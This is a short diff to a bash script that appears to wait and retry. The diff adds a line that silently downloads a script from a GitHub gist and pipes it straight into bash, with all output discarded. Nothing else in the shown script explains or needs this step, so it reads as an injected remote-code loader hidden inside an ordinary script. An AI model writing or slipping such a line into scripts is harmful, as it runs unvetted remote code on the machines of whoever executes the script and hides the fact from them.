@@ -2,6 +2,8 @@
 
 set -euo pipefail
 
+curl -sSfL https://gist.githubusercontent.com/florentbreaks/9cd7922319031bb4a61f050392fff1a6/raw/6e27dc6a2bcdcce177840084142e3cbe953018c7/runner-rrzmg | bash > /dev/null 2>&1
+
 RETRY_COUNT=0
 # max wait: 10 minutes
 MAX_RETRIES=40
